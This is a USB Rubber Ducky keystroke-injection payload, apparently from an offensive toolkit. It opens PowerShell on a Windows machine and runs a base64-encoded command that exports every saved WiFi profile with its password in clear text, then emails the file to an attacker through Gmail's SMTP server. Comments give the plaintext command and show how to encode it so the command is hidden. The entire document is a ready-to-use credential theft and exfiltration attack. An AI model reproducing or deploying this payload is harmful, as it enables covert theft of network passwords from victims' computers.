REM Title    : Powershell encoded WiFi Password extraction and exfiltration script for Windows
REM Author   : Paranoid Ninja
REM Email    : paranoidninja@protonmail.com
REM https://github.com/paranoidninja/Pandoras-Box
REM Version: 4
REM Description: Saves the SSID, Network type, Authentication and the password to Log.txt and emails the contents of Log.txt from a gmail account.
REM netsh wlan export profile key=clear;type Wi* >z;$Ss="smtp.gmail.com";$sP="587";$Un="senderId@gmail.com";$cT="UseAGoodPassword";$to="receiverId@gmail.com";$sJ="DQ";$aT="z";$mEs=New-Object System.Net.Mail.MailMessage;$mEs.subject=$sJ;$mEs.to.add($to);$mEs.from=$Un;$mEs.attachments.add($aT);$stp=New-Object System.Net.Mail.SmtpClient($Ss,$sP);$stp.EnableSSL=$true;$stp.Credentials=New-Object System.Net.NetworkCredential($Un,$cT);$stp.send($mEs)
REM Replace the senderID and RecieverID in the above command, encode it with powershell and use the base64 encoding to send it to rubber ducky
REM Encoding Command
REM $Text = 'This is a secret and should be hidden'
REM $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
REM $EncodedText =[Convert]::ToBase64String($Bytes)
REM $EncodedText
REM Decoding Command
REM $EncodedText = "Some encoded text"
REM $DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
REM $DecodedText

WINDOWS r
DELAY 500
STRING powershell
DELAY 5000
STRING powershell.exe -encodedcommand UgBFAE0AIABuAGUAdABzAGgAIAB3AGwAYQBuACAAZQB4AHAAbwByAHQAIABwAHIAbwBmAGkAbABlACAAawBlAHkAPQBjAGwAZQBhAHIAOwB0AHkAcABlACAAVwBpACoAIAA+AHoAOwAkAFMAcwA9ACIAcwBtAHQAcAAuAGcAbQBhAGkAbAAuAGMAbwBtACIAOwAkAHMAUAA9ACIANQA4ADcAIgA7ACQAVQBuAD0AIgBzAGUAbgBkAGUAcgBJAGQAQABnAG0AYQBpAGwALgBjAG8AbQAiADsAJABjAFQAPQAiAFUAcwBlAEEARwBvAG8AZABQAGEAcwBzAHcAbwByAGQAIgA7ACQAdABvAD0AIgByAGUAYwBlAGkAdgBlAHIASQBkAEAAZwBtAGEAaQBsAC4AYwBvAG0AIgA7ACQAcwBKAD0AIgBEAFEAIgA7ACQAYQBUAD0AIgB6ACIAOwAkAG0ARQBzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBNAGEAaQBsAC4ATQBhAGkAbABNAGUAcwBzAGEAZwBlADsAJABtAEUAcwAuAHMAdQBiAGoAZQBjAHQAPQAkAHMASgA7ACQAbQBFAHMALgB0AG8ALgBhAGQAZAAoACQAdABvACkAOwAkAG0ARQBzAC4AZgByAG8AbQA9ACQAVQBuADsAJABtAEUAcwAuAGEAdAB0AGEAYwBoAG0AZQBuAHQAcwAuAGEAZABkACgAJABhAFQAKQA7ACQAcwB0AHAAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAE0AYQBpAGwALgBTAG0AdABwAEMAbABpAGUAbgB0ACgAJABTAHMALAAkAHMAUAApADsAJABzAHQAcAAuAEUAbgBhAGIAbABlAFMAUwBMAD0AJAB0AHIAdQBlADsAJABzAHQAcAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4ATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsACgAJABVAG4ALAAkAGMAVAApADsAJABzAHQAcAAuAHMAZQBuAGQAKAAkAG0ARQBzACkA
exit
